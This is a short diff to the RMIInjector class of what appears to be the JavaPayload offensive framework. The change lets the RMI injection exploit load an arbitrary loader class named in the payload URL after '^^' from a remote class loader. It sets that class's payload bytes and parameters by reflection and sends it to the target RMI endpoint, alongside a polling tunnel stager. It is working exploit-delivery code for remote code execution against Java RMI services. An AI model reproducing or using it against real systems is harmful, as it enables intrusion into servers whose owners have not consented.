@@ -127,13 +127,24 @@ public class RMIInjector extends Injector {
 			classBytes[i] = out.toByteArray();
 		}
 
+		String className = "javapayload.loader.rmi.LoaderImpl";
+		int pos = url.indexOf("^^");
+		if (pos != -1) {
+			className = url.substring(pos+2);
+			url = url.substring(0, pos);
+		}
 		Endpoint endpoint = new TCPEndpoint(host, port);
 		URLClassLoader ucl = new URLClassLoader(new URL[] {new URL(url)});
-		Loader loaderImpl = (Loader)ucl.loadClass("javapayload.loader.rmi.LoaderImpl").newInstance();
-		loaderImpl.classes = classBytes;
-		loaderImpl.parameters = parameters;
-
-		callClean(endpoint, loaderImpl);
+		Object ldr = ucl.loadClass(className).newInstance();
+		if (ldr instanceof Loader) {
+			Loader loaderImpl = (Loader) ldr;
+			loaderImpl.classes = classBytes;
+			loaderImpl.parameters = parameters;
+		} else {
+			ldr.getClass().getField("classes").set(ldr, classBytes);
+			ldr.getClass().getField("parameters").set(ldr, parameters);
+		}
+		callClean(endpoint, ldr);
 		
 		if (isPollingTunnelStager) {
 			final PollingSenderImpl_Stub senderStub = new PollingSenderImpl_Stub(new UnicastRef2(new LiveRef(objid, endpoint, false)));
